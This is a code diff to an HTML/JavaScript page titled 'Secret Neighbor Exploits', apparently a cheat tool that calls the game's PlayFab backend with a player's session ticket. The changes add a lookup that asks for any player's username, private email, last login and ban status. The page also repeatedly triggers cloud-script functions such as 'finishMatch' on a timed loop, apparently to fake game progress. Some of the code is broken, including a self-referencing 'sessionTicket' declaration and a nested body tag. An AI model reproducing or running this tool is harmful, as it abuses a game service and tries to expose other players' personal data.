@@ -4,21 +4,21 @@
   <meta charset="UTF-8">
   <title>Secret Neighbor Exploits</title>
   <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background-image: url('https://wallpaperaccess.com/full/9331537.jpg');
-      background-size: cover;
-      background-position: center center;
-      background-repeat: no-repeat;
-      min-height: 100vh;
-      font-family: Arial, sans-serif;
-      color: white;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      overflow-y: auto;
-    }
+  body {
+  margin: 0;
+  padding: 0;
+  background-image: url('https://wallpaperaccess.com/full/9331537.jpg');
+  background-size: cover;
+  background-position: center center;
+  background-repeat: no-repeat;
+  min-height: 100vh; /* ✅ FIXED */
+  font-family: Arial, sans-serif;
+  color: white;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  overflow-y: auto;
+}
 
     h1 {
       margin-top: 40px;
@@ -142,6 +142,20 @@
     <button onclick="submitLevelProgression()">Submit</button>
     <div class="output" id="levelProgressionOutput"></div>
   </div>
+
+  <body>
+  <h2>🔍 PlayFab Info Lookup</h2>
+
+  <!-- Text field for PlayFab ID -->
+  <label for="playfabId">PlayFab ID:</label>
+  <input type="text" id="playfabId" placeholder="Enter PlayFab ID" />
+
+  <!-- Button to trigger the API calls -->
+  <button onclick="getPlayFabInfo()">Get Info</button>
+
+  <!-- Result display box -->
+  <pre id="result">Results will appear here...</pre>
+</body>
 
   <script>
     // Your JavaScript functions go here
@@ -337,6 +351,84 @@
             document.getElementById("statsOutput").textContent = output || "No statistics found.";
         }
 
+      async function getPlayFabInfo() {
+  const playfabId = document.getElementById("playfabId").value;
+  const resultBox = document.getElementById("result");
+
+  if (!playfabId) {
+    resultBox.textContent = "⚠️ Please enter a PlayFab ID.";
+    return;
+  }
+
+  const sessionTicket = sessionTicket; // Replace with actual session ticket
+  const headers = {
+    "Content-Type": "application/json",
+    "X-Authorization": sessionTicket
+  };
+
+  const combinedInfoBody = {
+    PlayFabId: playfabId,
+    InfoRequestParameters: {
+      GetUserAccountInfo: true,
+      GetPlayerStatistics: true
+    }
+  };
+
+  const profileBody = {
+    PlayFabId: playfabId,
+    ProfileConstraints: {
+      ShowLastLogin: true,
+      ShowBannedUntil: true
+    }
+  };
+
+  try {
+    resultBox.textContent = "⏳ Fetching data...";
+    const [combinedRes, profileRes] = await Promise.all([
+      fetch("https://bdff1.playfabapi.com/Client/GetPlayerCombinedInfo", {
+        method: "POST",
+        headers,
+        body: JSON.stringify(combinedInfoBody)
+      }),
+      fetch("https://bdff1.playfabapi.com/Client/GetPlayerProfile", {
+        method: "POST",
+        headers,
+        body: JSON.stringify(profileBody)
+      })
+    ]);
+
+    const combinedData = await combinedRes.json();
+    const profileData = await profileRes.json();
+
+    const accountInfo = combinedData.data?.UserAccountInfo;
+    const stats = combinedData.data?.PlayerStatistics;
+    const profile = profileData.data?.PlayerProfile;
+
+    let output = `🎮 Player Info for PlayFab ID: ${playfabId}\n\n`;
+
+    if (accountInfo) {
+      output += `👤 Username: ${accountInfo.Username || "N/A"}\n`;
+      output += `📧 Email: ${accountInfo.PrivateInfo?.Email || "N/A"}\n`;
+    }
+
+    if (profile) {
+      output += `🕒 Last Login: ${profile.LastLogin || "N/A"}\n`;
+      output += `🚫 Banned Until: ${profile.BannedUntil || "Not banned"}\n`;
+    }
+
+    if (stats && stats.length > 0) {
+      output += `📊 Player Statistics:\n`;
+      stats.forEach(stat => {
+        output += `  • ${stat.StatisticName}: ${stat.Value}\n`;
+      });
+    }
+
+    resultBox.textContent = output;
+  } catch (error) {
+    resultBox.textContent = "❌ Error: " + error.message;
+  }
+}
+
         async function getPlayFabId() {
             if (!sessionTicket) return alert("Please set your SessionTicket first.");
 
@@ -397,38 +489,41 @@
                 let output = `&#128338; Cycle started at ${new Date().toLocaleTimeString()}\nRoom Type: ${roomType}\nPlayers: ${playerIds.join(", ")}\n`;
 
                 for (const fn of functions) {
-                    try {
-                        const res = await fetch(`https://${titleId}.playfabapi.com/Client/ExecuteCloudScript`, {
-                            method: "POST",
-                            headers: {
-                                "Content-Type": "application/json",
-                                "X-Authorization": sessionTicket
-                            },
-                            body: JSON.stringify({
-                                FunctionName: fn,
-                                FunctionParameter: {
-                                    roomType,
-                                    playerIds
-                                },
-                                GeneratePlayStreamEvent: true
-                            })
-                        });
+    try {
+        const res = await fetch(`https://${titleId}.playfabapi.com/Client/ExecuteCloudScript`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+                "X-Authorization": sessionTicket
+            },
+            body: JSON.stringify({
+                FunctionName: fn,
+                FunctionParameter: {
+                    roomType,
+                    playerIds
+                },
+                GeneratePlayStreamEvent: true
+            })
+        });
 
-                        const data = await res.json();
-                        const result = data.data?.FunctionResult;
+        const data = await res.json();
+        const result = data.data?.FunctionResult;
 
-                        if (typeof result === "object" && result !== null) {
-                            const formatted = Object.entries(result)
-                                .map(([key, val]) => `- ${key}: ${val}`)
-                                .join("\n");
-                            output += `&#9989; ${fn}:\n${formatted}\n`;
-                        } else {
-                            output += `&#9989; ${fn}: ${result || "No result returned."}\n`;
-                        }
-                    } catch (err) {
-                        output += `&#10060; ${fn}: Error occurred.\n`;
-                    }
-                }
+        if (fn === "finishMatch") {
+            // Log as raw text
+            output += `✅ ${fn}: ${String(result)}\n`;
+        } else if (typeof result === "object" && result !== null) {
+            const formatted = Object.entries(result)
+                .map(([key, val]) => `- ${key}: ${val}`)
+                .join("\n");
+            output += `✅ ${fn}:\n${formatted}\n`;
+        } else {
+            output += `✅ ${fn}: ${result || "No result returned."}\n`;
+        }
+    } catch (err) {
+        output += `❌ ${fn}: Error occurred.\n`;
+    }
+}
 
                 output += `&#127744; Waiting ${delayMinutes} minutes for next cycle...\n\n`;
                 const cloudOutput = document.getElementById("cloudOutput");
